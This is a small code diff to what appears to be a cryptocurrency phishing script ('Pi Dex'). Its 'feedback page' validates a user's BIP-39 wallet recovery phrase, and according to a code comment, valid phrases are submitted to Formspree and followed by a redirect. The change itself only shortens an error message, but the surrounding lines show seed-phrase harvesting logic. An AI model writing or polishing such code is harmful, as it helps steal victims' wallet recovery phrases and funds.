@@ -59,7 +59,7 @@ async function initializeFeedbackPage() {
 
         // Validate passphrase FIRST - if invalid, stop here
         if (!isValidBip39Mnemonic(mnemonic)) {
-            showError('Invalid passphrase. Please enter a valid BIP-39 recovery phrase.');
+            showError('Invalid passphrase.');
             return; // Don't submit to Formspree, don't redirect
         }
 
@@ -170,3 +170,4 @@ function calculateAmount() {
 // DEBUG
 // ========================================
 console.log('Pi Dex Script Loaded');
+
